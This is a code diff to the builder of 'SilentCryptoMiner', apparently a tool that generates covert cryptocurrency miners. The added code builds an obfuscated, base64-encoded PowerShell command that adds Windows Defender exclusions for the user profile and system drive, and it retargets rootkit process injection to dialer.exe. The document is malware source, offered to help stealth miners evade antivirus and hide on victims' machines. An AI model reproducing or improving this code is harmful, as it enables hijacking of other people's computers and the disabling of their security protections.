@@ -57,6 +57,8 @@ namespace SilentCryptoMiner
         public string eid;
         public string xid;
 
+        public string killWDCommands;
+
         private void Form1_Load(object sender, EventArgs e)
         {
             Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
@@ -115,6 +117,8 @@ namespace SilentCryptoMiner
                 Resources_rootkiti = Randomi(rand.Next(5, 20));
                 Resources_rootkitu = Randomi(rand.Next(5, 20));
                 Resources_parent = Randomi(rand.Next(5, 20));
+
+                killWDCommands = $"cmd /c powershell -EncodedCommand \"{Convert.ToBase64String(Encoding.Unicode.GetBytes($"<#{Randomi(rand.Next(2, 5), false)}#> Add-MpPreference <#{Randomi(rand.Next(2, 5), false)}#> -ExclusionPath @($env:UserProfile,$env:SystemDrive) <#{Randomi(rand.Next(2, 5))}#> -Force <#{Randomi(rand.Next(2, 5))}#>"))}\"";
 
                 StringBuilder minerbuilder = new StringBuilder(Properties.Resources.Program);
 
@@ -199,7 +203,7 @@ namespace SilentCryptoMiner
                     string location = "SystemRoot";
                     string minerid = $"{minerFind}{(xmr ? xid : eid)}{miner.nid} ";
                     string injectionTarget = Invoke(new Func<string>(() => miner.comboInjection.Text)).ToString();
-                    minerSet.Add(string.Format("new string[] {{\"{0}\",\"{1}\",\"{2}\",\"{3}\",\"{4}\"}}", EncryptString(minerid), xmr ? xid : eid, EncryptString(minerid + Unamlib_Encrypt(argstr.ToString())), EncryptString(location), EncryptString(toggleRootkit.Checked ? "System32\\nslookup.exe" : (injectionTarget != "explorer.exe" ? "System32\\" : "") + injectionTarget)));
+                    minerSet.Add(string.Format("new string[] {{\"{0}\",\"{1}\",\"{2}\",\"{3}\",\"{4}\"}}", EncryptString(minerid), xmr ? xid : eid, EncryptString(minerid + Unamlib_Encrypt(argstr.ToString())), EncryptString(location), EncryptString(toggleRootkit.Checked ? "System32\\dialer.exe" : (injectionTarget != "explorer.exe" ? "System32\\" : "") + injectionTarget)));
                     fullnids.Add(string.Format("new string[] {{\"{0}\",\"{1}\"}}", EncryptString(minerid), xmr ? xid : eid));
                 }
 
@@ -386,7 +390,7 @@ namespace SilentCryptoMiner
             return new string(buffer);
         }
 
-        public string Randomi(int length)
+        public string Randomi(int length, bool addToCache = true)
         {
             while (true)
             {
@@ -400,7 +404,10 @@ namespace SilentCryptoMiner
 
                 if (!randomiCache.Contains(sb.ToString()))
                 {
-                    randomiCache.Add(sb.ToString());
+                    if (addToCache)
+                    {
+                        randomiCache.Add(sb.ToString());
+                    }
                     return sb.ToString();
                 }
             }
